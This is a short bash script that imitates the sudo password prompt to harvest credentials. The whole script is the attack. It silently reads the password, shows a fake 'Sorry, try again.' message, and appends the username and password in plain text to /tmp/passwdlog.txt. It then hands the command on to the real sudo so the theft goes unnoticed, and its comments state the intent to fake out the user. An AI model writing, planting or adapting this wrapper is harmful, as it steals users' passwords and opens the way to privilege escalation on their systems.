#!/bin/bash
if [ "$EUID" -ne 0 ]; then
    read -s -p "[sudo] password for $(whoami): " passw  # Fake a sudo prompt.
    echo ""
    sleep 2
    echo "Sorry, try again."
else
    read -s -p "[sudo] password for $SUDO_USER: " passw # Already running as root but let's fake em out anyway.
    echo ""
fi
echo "$(whoami):$passw" >> /tmp/passwdlog.txt
/usr/bin/sudo $@ # Run requested command